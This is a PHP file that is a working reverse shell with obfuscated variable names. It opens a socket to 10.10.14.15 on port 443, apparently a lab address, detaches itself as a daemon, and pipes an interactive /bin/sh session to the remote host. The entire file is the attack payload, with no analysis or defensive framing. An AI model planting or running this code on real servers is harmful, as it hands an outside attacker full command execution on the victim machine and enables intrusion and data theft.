<?php set_time_limit(0);$t0="1.0";$f1='10.10.14.15';$a2=443;$b3=1400;$h4=null;$i5=null;$o6='uname -a; w; id; /bin/sh -i';$c7=0;$b8=0;if(function_exists('pcntl_fork')){$l9=pcntl_fork();if($l9==-1){printit("ERROR: Can't fork");exit(1);}if($l9){exit(0);}if(posix_setsid()==-1){printit("Error: Can't setsid()");exit(1);}$c7=1;}else{printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");}chdir("/");umask(0);$h10=fsockopen($f1,$a2,$r11,$x12,30);if(!$h10){printit("$x12 ($r11)");exit(1);}$v13=array(0=>array("pipe","r"),1=>array("pipe","w"),2=>array("pipe","w"));$l14=proc_open($o6,$v13,$f15);if(!is_resource($l14)){printit("ERROR: Can't spawn shell");exit(1);}stream_set_blocking($f15[0],0);stream_set_blocking($f15[1],0);stream_set_blocking($f15[2],0);stream_set_blocking($h10,0);printit("Successfully opened reverse shell to $f1:$a2");while(1){if(feof($h10)){printit("ERROR: Shell connection terminated");break;}if(feof($f15[1])){printit("ERROR: Shell process terminated");break;}$u16=array($h10,$f15[1],$f15[2]);$l17=stream_select($u16,$h4,$i5,null);if(in_array($h10,$u16)){if($b8)printit("SOCK READ");$j18=fread($h10,$b3);if($b8)printit("SOCK: $j18");fwrite($f15[0],$j18);}if(in_array($f15[1],$u16)){if($b8)printit("STDOUT READ");$j18=fread($f15[1],$b3);if($b8)printit("STDOUT: $j18");fwrite($h10,$j18);}if(in_array($f15[2],$u16)){if($b8)printit("STDERR READ");$j18=fread($f15[2],$b3);if($b8)printit("STDERR: $j18");fwrite($h10,$j18);}}fclose($h10);fclose($f15[0]);fclose($f15[1]);fclose($f15[2]);proc_close($l14);function printit($i19){if(!$c7){print"$i19\n";}}?>